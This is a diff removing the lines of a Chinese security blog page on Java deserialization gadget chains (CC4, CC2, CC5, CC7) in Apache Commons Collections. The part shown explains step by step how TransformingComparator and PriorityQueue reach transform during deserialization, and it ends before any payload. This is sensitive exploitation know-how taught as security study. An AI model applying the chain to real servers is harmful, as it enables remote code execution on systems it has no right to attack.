@@ -1,493 +1,62 @@
-
-<!DOCTYPE html><html lang="zh-CN">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
-  
-  <meta name="generator" content="Hexo 7.1.0">
-  <meta http-equiv='x-dns-prefetch-control' content='on' />
-  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
-  <meta name="renderer" content="webkit">
-  <meta name="force-rendering" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-  <meta name="HandheldFriendly" content="True" >
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="theme-color" content="#f8f8f8">
-  
-  <title>漏洞篇 - Java 反序列化之 CC4+CC2+CC5+CC7 链 - 妙尽璇机</title>
-
-  
-    <meta name="description" content="CC4 链在 Commons Collections 版本为 3.2.1 的背景下，可以使用 TransformedMap 或者 LazyMap 来执行 transform 方法，但当 Commons Collections 的版本提升到 4.0 时，就又多出了一种办法：利用 TransformingComparator 来执行 transform 方法。 先前我们将 AnnotationInvo">
-<meta property="og:type" content="article">
-<meta property="og:title" content="漏洞篇 - Java 反序列化之 CC4+CC2+CC5+CC7 链">
-<meta property="og:url" content="https://changeyourway.github.io/2024/06/05/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC4+CC2+CC5+CC7%E9%93%BE%E5%88%86%E6%9E%90/index.html">
-<meta property="og:site_name" content="妙尽璇机">
-<meta property="og:description" content="CC4 链在 Commons Collections 版本为 3.2.1 的背景下，可以使用 TransformedMap 或者 LazyMap 来执行 transform 方法，但当 Commons Collections 的版本提升到 4.0 时，就又多出了一种办法：利用 TransformingComparator 来执行 transform 方法。 先前我们将 AnnotationInvo">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240530173750752.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240603145606511.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240603144348816.png">
-<meta property="article:published_time" content="2024-06-05T06:03:01.842Z">
-<meta property="article:modified_time" content="2024-09-26T10:35:07.863Z">
-<meta property="article:author" content="妙尽璇机">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20240530173750752.png">
-  
-  
-  
-  
-
-  <!-- feed -->
-  
-    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
-  
-
-  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
-
-  
-    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
-  
-
-  
-
-  
-  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
-</head>
-<body>
-
-<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
-
-
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/ChangeYourWay/changeyourway.github.io/refs/heads/main/assets/20210722092640_f61bd.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">真理所致，吾心所向</div></a></div></header>
-
-<div class="nav-area">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
-
-
-<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
-</div>
-<div class="widgets">
-
-<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC4-%E9%93%BE"><span class="toc-text">CC4 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B-TransformingComparator"><span class="toc-text">利用链之 TransformingComparator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB%E4%B9%8B-PriorityQueue"><span class="toc-text">入口类之 PriorityQueue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88%E6%80%BB%E7%BB%93"><span class="toc-text">调用栈总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-%E9%93%BE"><span class="toc-text">CC2 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88%E6%80%BB%E7%BB%93-1"><span class="toc-text">调用栈总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-1"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5-%E9%93%BE"><span class="toc-text">CC5 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B-TiedMapEntry"><span class="toc-text">利用链之 TiedMapEntry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB%E4%B9%8B-BadAttributeValueExpException"><span class="toc-text">入口类之 BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88%E6%80%BB%E7%BB%93-2"><span class="toc-text">调用栈总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-2"><span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7-%E9%93%BE"><span class="toc-text">CC7 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B-AbstractMap"><span class="toc-text">利用链之 AbstractMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B-AbstractMapDecorator"><span class="toc-text">利用链之 AbstractMapDecorator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB%E4%B9%8B-Hashtable"><span class="toc-text">入口类之 Hashtable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-3"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88%E6%80%BB%E7%BB%93-3"><span class="toc-text">调用栈总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div></div></widget>
-
-
-
-
-
-
-
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2025/06/02/CTF/2025%20D%5E3CTF%20Web%20WP/"><span class="title">2025 D^3CTF Web WP</span></a><a class="item title" href="/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><span class="title">漏洞篇 - JNDI 注入详解</span></a><a class="item title" href="/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Hessian 反序列化详解</span></a><a class="item title" href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - SnakeYaml 反序列化</span></a><a class="item title" href="/2025/04/30/CTF/2025%20ACTF%20Web%20WP/"><span class="title">2025 ACTF Web 复现</span></a></div></widget>
-</div>
-
-</div></aside><div class="l_main" id="main">
-
-
-
-
-
-<div class="article banner top">
-  <div class="content">
-    
-<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Java-%E5%AE%89%E5%85%A8/">Java 安全</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-06-05T06:03:01.842Z">2024-06-05</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-09-26T10:35:07.863Z">2024-09-26</time></span></div></div>
-</div>
-
-    
-    <div class="bottom">
-      <div class="text-area">
-        <h1 class="text title"><span>漏洞篇 - Java 反序列化之 CC4+CC2+CC5+CC7 链</span></h1>
-      </div>
-    </div>
-    
-  </div>
-  </div><article class="md-text content"><h2 id="CC4-链"><a href="#CC4-链" class="headerlink" title="CC4 链"></a>CC4 链</h2><p>在 Commons Collections 版本为 3.2.1 的背景下，可以使用 TransformedMap 或者 LazyMap 来执行 transform 方法，但当 Commons Collections 的版本提升到 4.0 时，就又多出了一种办法：利用 TransformingComparator 来执行 transform 方法。</p>
-<p>先前我们将 AnnotationInvocationHandler 和 HashMap 作为入口类，利用它们的 readObject 方法来反序列化，但是现在我们还可以利用 PriorityQueue 的 readObject 来反序列化。</p>
-<p><strong>实验环境</strong> </p>
-<ul>
-<li>java &#x3D; 8u65</li>
-<li>CommonsCollections &#x3D; 4.0</li>
-</ul>
-<p>pom.xml 中导入如下依赖：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用链之-TransformingComparator"><a href="#利用链之-TransformingComparator" class="headerlink" title="利用链之 TransformingComparator"></a>利用链之 TransformingComparator</h3><p>在 CommonsCollections 4.0 版本中，TransformingComparator 实现了 Serializable 接口，可以被序列化，而在 3.2.1 版本中是不可序列化的。</p>
-<p>TransformingComparator 的 compare 方法中就调用了 transform 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int compare(I obj1, I obj2) &#123;</span><br><span class="line">    O value1 = this.transformer.transform(obj1);</span><br><span class="line">    O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>transformer 是 TransformingComparator 中定义的属性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Transformer&lt;? super I, ? extends O&gt; transformer;</span><br></pre></td></tr></table></figure>
-
-<p>这个属性在构造方法中被赋值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated) &#123;</span><br><span class="line">    this.decorated = decorated;</span><br><span class="line">    this.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>另一个构造方法又调用了这个构造方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123;</span><br><span class="line">    this(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>都是 public ，好说。</p>
-<h3 id="入口类之-PriorityQueue"><a href="#入口类之-PriorityQueue" class="headerlink" title="入口类之 PriorityQueue"></a>入口类之 PriorityQueue</h3><h6 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue#siftDownUsingComparator()"></a>PriorityQueue#siftDownUsingComparator()</h6><p>PriorityQueue 类的 siftDownUsingComparator 方法调用了 comparator 的 compare 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">    int half = size &gt;&gt;&gt; 1;</span><br><span class="line">    while (k &lt; half) &#123;</span><br><span class="line">        int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        int right = child + 1;</span><br><span class="line">        if (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; 0)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">            break;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>comparator 是 PriorityQueue 中定义的成员属性：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Comparator&lt;? super E&gt; comparator;</span><br></pre></td></tr></table></figure>
-
-<p>在构造方法中被赋值：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public PriorityQueue(int initialCapacity,</span><br><span class="line">                     Comparator&lt;? super E&gt; comparator) &#123;</span><br><span class="line">    // Note: This restriction of at least one is not actually needed,</span><br><span class="line">    // but continues for 1.5 compatibility</span><br><span class="line">    if (initialCapacity &lt; 1)</span><br><span class="line">        throw new IllegalArgumentException();</span><br><span class="line">    this.queue = new Object[initialCapacity];</span><br><span class="line">    this.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个构造方法又被另一个构造方法调用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public PriorityQueue(Comparator&lt;? super E&gt; comparator) &#123;</span><br><span class="line">    this(DEFAULT_INITIAL_CAPACITY, comparator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>只需要将 PriorityQueue 的 comparator 属性赋值成 TransformingComparator 对象即可。</p>
-<h6 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue#siftDown()"></a>PriorityQueue#siftDown()</h6><p>PriorityQueue 的 siftDown 方法调用了 siftDownUsingComparator 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private void siftDown(int k, E x) &#123;</span><br><span class="line">    if (comparator != null)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    else</span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue#heapify()"></a>PriorityQueue#heapify()</h6><p>PriorityQueue 的 heapify 方法调用了 siftDown 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>但是通过代码我们可以发现，进入 for 循环的条件是 <code>(size &gt;&gt;&gt; 1) - 1 &gt;= 0</code> ，意思就是将 size 的二进制位无符号右移一位（高位用 0 补全）再减去 1 要大于等于 0 ，故而 size 要大于等于 2 。</p>
-<p>size 是 PriorityQueue 中定义的属性，初始值为 0：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private int size = 0;</span><br></pre></td></tr></table></figure>
-
-<p>想要增加 size 的值，可以通过 PriorityQueue 的 offer 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public boolean offer(E e) &#123;</span><br><span class="line">    if (e == null)</span><br><span class="line">        throw new NullPointerException();</span><br><span class="line">    modCount++;</span><br><span class="line">    int i = size;</span><br><span class="line">    if (i &gt;= queue.length)</span><br><span class="line">        grow(i + 1);</span><br><span class="line">    size = i + 1;</span><br><span class="line">    if (i == 0)</span><br><span class="line">        queue[0] = e;</span><br><span class="line">    else</span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从代码中可以看出，offer 方法每被调用一次，size 都会在原来的基础上加 1 。</p>
-<p>当然也可以使用 PriorityQueue 的 add 方法，add 方法调用了 offer 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public boolean add(E e) &#123;</span><br><span class="line">    return offer(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>至于这里为什么不直接用反射修改呢，原因是 size 表示的是这个优先队列中元素的个数：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240530173750752.png">
-
-<p>如果不往这个优先队列中添加元素，而是直接暴力反射修改 size 的值，那么在序列化时将会报错，导致反序列化无法进行。</p>
-<p>具体可以看 PriorityQueue 的 writeObject 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream s)</span><br><span class="line">    throws java.io.IOException &#123;</span><br><span class="line">    // Write out element count, and any hidden stuff</span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    // Write out array length, for compatibility with 1.5 version</span><br><span class="line">    s.writeInt(Math.max(2, size + 1));</span><br><span class="line"></span><br><span class="line">    // Write out all elements in the &quot;proper order&quot;.</span><br><span class="line">    for (int i = 0; i &lt; size; i++)</span><br><span class="line">        s.writeObject(queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue#readObject()"></a>PriorityQueue#readObject()</h6><p>PriorityQueue 的 readObject 方法调用了 heapify 方法：</p>
